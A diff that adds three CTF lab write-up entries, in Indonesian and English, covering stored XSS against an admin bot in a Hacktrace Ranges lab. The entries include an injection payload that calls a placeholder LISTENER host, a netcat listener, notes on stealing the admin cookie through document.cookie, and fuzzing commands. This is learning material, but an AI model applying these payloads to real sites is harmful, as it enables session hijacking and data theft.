@@ -2498,5 +2498,140 @@
     ],
     "summary": "Lesson metodologi CTF dari Cannonbolt: brute-force yang berlarut-larut merupakan sinyal bahwa approach salah — maker sudah menyediakan clue direktif yang perlu dibaca lebih awal. Recon yang efektif mencakup kemampuan mengenali kapan harus berhenti dari enumeration brute-force dan beralih ke analisis manual terhadap petunjuk yang tersedia.",
     "url": "https://drive.google.com/file/d/1PwNndRjLnMBUFGTBvlOM3lE34_EXQIrR/view?usp=sharing"
+  },
+  {
+    "id": "hacktrace-noextraordinary-stored-xss",
+    "date": "2026-05-31",
+    "title": "NoExtraordinary — Stored XSS via Support Ticket & HeadlessChrome Admin Bot",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "xss",
+      "stored-xss",
+      "admin-bot",
+      "headlesschrome",
+      "innerhtml",
+      "offensive",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Ticket injection via POST /support/submit — message field tidak disanitasi sebelum dirender admin bot",
+      "HeadlessChrome admin bot render konten ticket menggunakan innerHTML tanpa escaping, memungkinkan arbitrary JS execution di context admin",
+      "Konfirmasi JS execution via onerror event handler pada elemen img — synchronous, tidak butuh network round-trip",
+      "Write primitive via XSS: panggil fungsi admin (updateStatus) langsung dari injected script context"
+    ],
+    "terms": [
+      "stored XSS",
+      "admin bot",
+      "HeadlessChrome",
+      "innerHTML",
+      "onerror event handler",
+      "write primitive",
+      "updateStatus",
+      "ticket injection"
+    ],
+    "commands": [
+      "curl -s -X POST http://noextraordinary.htr:3000/support/submit -H 'Content-Type: application/json' -d '{\"name\":\"x\",\"email\":\"a@b.com\",\"subject\":\"test\",\"message\":\"<img src=http://LISTENER/MARKER>\"}'",
+      "nc -lvnp 8000"
+    ],
+    "problems": [
+      "Identifikasi bahwa admin bot merender ticket dengan innerHTML tanpa sanitasi",
+      "Temukan bahwa onerror event handler bisa dijadikan konfirmasi synchronous JS execution tanpa network round-trip"
+    ],
+    "summary": "Stored XSS di NoExtraordinary (Hacktrace Ranges, Moderate, in progress) via ticket submission endpoint — payload di-inject ke POST /support/submit, dirender oleh HeadlessChrome admin bot menggunakan innerHTML tanpa sanitasi, menghasilkan arbitrary JS execution di admin context dengan write primitive untuk panggil updateStatus langsung dari XSS payload.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-noextraordinary-cookie-exfil",
+    "date": "2026-05-31",
+    "title": "NoExtraordinary — Admin Cookie Exfil via XSS & Dual Auth Mechanism Analysis",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "xss",
+      "cookie-theft",
+      "session-hijack",
+      "httponly",
+      "admin-session",
+      "ip-gate",
+      "dual-auth",
+      "offensive",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Eksfiltrasi admin_session cookie via document.cookie — cookie tidak di-set HttpOnly sehingga accessible dari JS context",
+      "Dual auth mechanism: X-Admin-Session header untuk API calls + admin_session cookie untuk dashboard access",
+      "IP-based access gate: admin dashboard hanya accessible dari localhost — token valid tidak cukup untuk direct access dari luar"
+    ],
+    "terms": [
+      "admin_session cookie",
+      "HttpOnly flag",
+      "document.cookie",
+      "X-Admin-Session header",
+      "dual auth",
+      "IP-based access control",
+      "localhost gate"
+    ],
+    "commands": [
+      "curl -s -i http://noextraordinary.htr:3000/admin/ -b 'admin_session=TOKEN'",
+      "curl -s http://noextraordinary.htr:5000/debug/info"
+    ],
+    "problems": [
+      "Identifikasi bahwa admin_session cookie tidak di-set HttpOnly sehingga accessible via document.cookie dari XSS payload",
+      "Pahami mengapa token valid tidak langsung memberikan akses — IP gate memblokir request dari luar localhost"
+    ],
+    "summary": "Eksfiltrasi admin_session cookie via document.cookie dari XSS context (non-HttpOnly) di NoExtraordinary — analisis dual auth mechanism mengungkap X-Admin-Session header berlaku untuk API calls sementara admin_session cookie untuk dashboard, dengan IP-based gate yang hanya mengizinkan akses dari localhost sehingga token saja tidak cukup untuk direct access.",
+    "url": ""
+  },
+  {
+    "id": "hacktrace-noextraordinary-xss-api-enum",
+    "date": "2026-05-31",
+    "title": "NoExtraordinary — Internal API Enumeration via XSS: Source Exfil, performance.getEntries, Fetch Hook",
+    "platform": "Hacktrace Ranges",
+    "category": "Web Exploitation",
+    "tags": [
+      "xss",
+      "api-enumeration",
+      "fetch-hook",
+      "performance-api",
+      "source-exfil",
+      "dom-exfil",
+      "async",
+      "offensive",
+      "hacktrace",
+      "moderate"
+    ],
+    "concepts": [
+      "Source code exfil admin dashboard via XSS: loadTickets dan updateStatus diekstrak untuk map internal API structure",
+      "performance.getEntries() untuk enumerate semua URL yang di-load admin panel di browser context bot",
+      "Fetch hook technique: override window.fetch sebelum bot execute untuk intercept API_BASE resolution",
+      "DOM innerText exfil: baca rendered ticket content secara synchronous via element.innerText — reliable karena tidak mengandalkan async resolution",
+      "Async vs sync constraint: bot navigate away sebelum Promise-based techniques resolve — synchronous exfil methods lebih reliable"
+    ],
+    "terms": [
+      "performance.getEntries()",
+      "fetch hook",
+      "window.fetch override",
+      "API_BASE",
+      "DOM innerText exfil",
+      "synchronous exfil",
+      "async constraint",
+      "loadTickets",
+      "updateStatus"
+    ],
+    "commands": [
+      "curl -s http://noextraordinary.htr:5000/js/main.js",
+      "curl -s http://noextraordinary.htr:8080/api/availability",
+      "curl -s http://noextraordinary.htr:8080/api/archived",
+      "ffuf -w raft-medium-words.txt -u http://noextraordinary.htr:8080/api/FUZZ -mc all -ac"
+    ],
+    "problems": [
+      "Teknik fetch-based exfil gagal karena bot navigate away sebelum async Promise resolve — fallback ke synchronous exfil (innerText, document.cookie)",
+      "Enumerate internal API endpoints yang tidak accessible dari luar menggunakan performance.getEntries() dari bot context"
+    ],
+    "summary": "Enumerasi internal API NoExtraordinary via XSS primitives: source code admin dashboard diekstrak untuk map API structure, performance.getEntries() digunakan untuk enumerate URL yang di-load bot, fetch hook di-inject untuk intercept API_BASE resolution. Constraint kritis: bot navigate away sebelum async Promise resolve, sehingga exfil harus menggunakan synchronous methods (innerText, document.cookie) untuk reliable extraction.",
+    "url": ""
   }
 ]
